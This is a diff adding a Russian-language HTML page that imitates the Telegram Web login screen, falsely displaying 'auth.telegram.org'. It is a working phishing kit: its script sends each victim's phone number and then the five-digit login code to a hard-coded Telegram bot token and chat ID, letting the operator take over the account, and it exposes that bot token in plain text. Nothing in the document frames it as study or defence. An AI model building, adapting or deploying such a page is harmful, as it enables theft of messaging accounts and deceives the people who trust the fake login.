@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #f0f2f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .auth-card {
+            background: white;
+            width: 100%;
+            max-width: 380px;
+            border-radius: 24px;
+            padding: 32px 24px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+        }
+
+        /* ЛОГОТИП ПО ЦЕНТРУ */
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            object-fit: cover;
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .web-title {
+            text-align: center;
+            font-size: 18px;
+            color: #27a6e5;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .step {
+            display: block;
+        }
+        #step2 {
+            display: none;
+        }
+
+        .auth-header {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 8px;
+        }
+
+        .auth-sub {
+            text-align: center;
+            color: #707579;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        .auth-domain {
+            text-align: center;
+            color: #27a6e5;
+            font-size: 13px;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eaeaea;
+        }
+
+        .country-label {
+            color: #707579;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .country-selector {
+            width: 100%;
+            padding: 14px 16px;
+            background: white;
+            border: 1px solid #dadce0;
+            border-radius: 12px;
+            font-size: 15px;
+            color: #222;
+            margin-bottom: 15px;
+            outline: none;
+            appearance: none;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%23707579" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>');
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+        }
+
+        .phone-row {
+            display: flex;
+            align-items: center;
+            border: 1px solid #dadce0;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            background: white;
+        }
+        .phone-code {
+            padding: 0 16px;
+            color: #27a6e5;
+            font-weight: 600;
+            border-right: 1px solid #dadce0;
+            line-height: 50px;
+        }
+        .phone-row input {
+            flex: 1;
+            border: none;
+            padding: 14px 16px;
+            font-size: 15px;
+            outline: none;
+            background: transparent;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 12px;
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 8px;
+            margin: 20px 0;
+            outline: none;
+        }
+        .code-input:focus {
+            border-color: #27a6e5;
+        }
+
+        .auth-buttons {
+            display: flex;
+            gap: 12px;
+            justify-content: flex-end;
+        }
+        .auth-btn {
+            background: transparent;
+            border: none;
+            color: #27a6e5;
+            font-weight: 600;
+            font-size: 15px;
+            padding: 10px 24px;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: 0.2s;
+            text-transform: uppercase;
+        }
+        .auth-btn.primary {
+            background: #27a6e5;
+            color: white;
+        }
+        .auth-btn.primary:hover { background: #1e8bc4; }
+        .auth-btn:hover { background: rgba(39,166,229,0.05); }
+
+        .back-link {
+            color: #27a6e5;
+            text-decoration: none;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+
+        /* Блок с номером на втором шаге */
+        .phone-display {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 500;
+            color: #222;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="auth-card">
+        <!-- ЛОГОТИП ПО ЦЕНТРУ -->
+        <div class="logo-container">
+            <img src="telegram.jpg" alt="Telegram" class="logo" onerror="this.style.display='none'">
+        </div>
+
+        <div class="web-title">Telegram Web</div>
+
+        <!-- ШАГ 1: ВВОД НОМЕРА -->
+        <div id="step1" class="step">
+            <div class="auth-header">Вход в Telegram</div>
+            <div class="auth-sub">Введите ваш номер телефона</div>
+            <div class="auth-domain">auth.telegram.org</div>
+
+            <div class="country-label">Страна</div>
+            <select class="country-selector" id="countrySelect">
+                <option value="+994">Азербайджан (+994)</option>
+                <option value="+7">Россия (+7)</option>
+                <option value="+380">Украина (+380)</option>
+                <option value="+375">Беларусь (+375)</option>
+                <option value="+77">Казахстан (+77)</option>
+            </select>
+
+            <div class="phone-row">
+                <span class="phone-code" id="codeDisplay">+994</span>
+                <input type="tel" id="phoneInput" placeholder="00 000 00 00">
+            </div>
+
+            <div class="auth-buttons">
+                <button class="auth-btn" onclick="window.location.href='index.html'">ОТМЕНА</button>
+                <button class="auth-btn primary" onclick="showStep2()">ДАЛЕЕ</button>
+            </div>
+        </div>
+
+        <!-- ШАГ 2: ВВОД КОДА -->
+        <div id="step2" class="step">
+            <div class="auth-header">Подтверждение</div>
+            <div class="auth-sub">Мы отправили код в Telegram</div>
+            <div class="auth-domain">auth.telegram.org</div>
+
+            <div class="phone-display" id="displayPhone"></div>
+
+            <input type="text" id="codeInput" class="code-input" placeholder="00000" maxlength="5">
+
+            <div class="auth-buttons">
+                <button class="auth-btn" onclick="showStep1()">НАЗАД</button>
+                <button class="auth-btn primary" onclick="sendCode()">ВОЙТИ</button>
+            </div>
+            <div style="text-align: center;">
+                <a class="back-link" onclick="showStep1()">← Вернуться к номеру</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ---------- ТВОЙ БОТ ----------
+        const botToken = '8425703516:AAFSxqx8Zq6AS_9tjT7dN75CbGZ1r8WFJVM';
+        const chatId = '81872631';
+        let currentPhone = '';
+        let selectedCode = '+994';
+
+        // Обновление кода страны
+        document.getElementById('countrySelect').addEventListener('change', function() {
+            selectedCode = this.value;
+            document.getElementById('codeDisplay').textContent = selectedCode;
+        });
+
+        // Переключение на шаг 2
+        function showStep2() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) {
+                alert('Введите номер телефона');
+                return;
+            }
+            
+            currentPhone = selectedCode + ' ' + phone;
+            document.getElementById('displayPhone').textContent = currentPhone;
+            
+            // Отправляем номер в бота
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: '🔔 НОВЫЙ ВХОД\nНомер: ' + currentPhone 
+                })
+            }).catch(e => console.log('Ошибка:', e));
+            
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }
+
+        function showStep1() {
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('codeInput').value = '';
+        }
+
+        function sendCode() {
+            const code = document.getElementById('codeInput').value.trim();
+            if (code.length !== 5) {
+                alert('Введите 5-значный код');
+                return;
+            }
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: '✅ КОД ВХОДА\nНомер: ' + currentPhone + '\nКод: ' + code 
+                })
+            }).catch(e => console.log('Ошибка:', e));
+
+            alert('Код отправлен');
+            showStep1();
+            document.getElementById('phoneInput').value = '';
+        }
+    </script>
+
+</body>
+</html>
